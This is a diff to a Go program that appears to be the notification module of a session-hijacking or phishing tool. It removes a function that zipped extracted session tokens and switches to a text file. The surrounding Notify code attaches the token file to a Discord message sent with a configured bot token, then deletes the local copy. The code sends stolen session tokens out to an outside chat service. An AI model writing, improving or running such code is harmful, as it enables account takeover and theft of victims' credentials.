@@ -1,7 +1,6 @@
 package main
 
 import (
-	"archive/zip"
 	"encoding/json"
 	"fmt"
 	"math/rand"
@@ -135,64 +134,6 @@ func createTxtFile(session Session) (string, error) {
 	return txtFilePath, nil
 }
 
-func createZipFile(session Session) (string, error) {
-	// Create a random zip file name
-	zipFileName := generateRandomString() + ".zip"
-	txtFilePath := filepath.Join(os.TempDir(), zipFileName)
-
-	// Create a new zip file
-	zipFile, err := os.Create(txtFilePath)
-	if err != nil {
-		return "", fmt.Errorf("failed to create zip file: %v", err)
-	}
-	defer zipFile.Close()
-
-	// Initialize the zip writer
-	zipWriter := zip.NewWriter(zipFile)
-	defer zipWriter.Close()
-
-	// Marshal the session maps into JSON byte slices
-	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
-	}
-
-	var rawTokens map[string]map[string]map[string]interface{}
-	if err := json.Unmarshal([]byte(tokensJSON), &rawTokens); err != nil {
-		fmt.Println("Error parsing tokensJSON:", err)
-
-	}
-
-	tokens := extractTokens(rawTokens)
-
-	tokensOutput, err := json.MarshalIndent(tokens, "", "  ")
-	if err != nil {
-		fmt.Println("Error marshalling tokens:", err)
-
-	}
-
-	// Define the file names for each token
-	files := map[string][]byte{
-		"Tokens-" + generateRandomString() + ".txt": tokensOutput,
-	}
-
-	// Add each token as a text file to the zip
-	for fileName, fileContent := range files {
-		fileWriter, err := zipWriter.Create(fileName)
-		if err != nil {
-			return "", fmt.Errorf("failed to create zip entry for %s: %v", fileName, err)
-		}
-
-		// Write content into the zip entry
-		_, err = fileWriter.Write(fileContent)
-		if err != nil {
-			return "", fmt.Errorf("failed to write content to %s: %v", fileName, err)
-		}
-	}
-
-	return txtFilePath, nil
-}
-
 func formatSessionMessage(session Session) string {
 	// Format the session information (no token data in message)
 	return fmt.Sprintf("✨ Session Information ✨\n\n"+
@@ -262,11 +203,11 @@ func Notify(session Session) {
 		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message, txtFilePath)
 	}
 
-	// After sending, delete the zip file
+	// After sending, delete the Txt file
 	err = os.Remove(txtFilePath)
 	if err != nil {
-		fmt.Printf("Error deleting zip file: %v\n", err)
+		fmt.Printf("Error deleting Txt file: %v\n", err)
 	} else {
-		fmt.Println("Zip file deleted successfully.")
+		fmt.Println("Txt file deleted successfully.")
 	}
 }
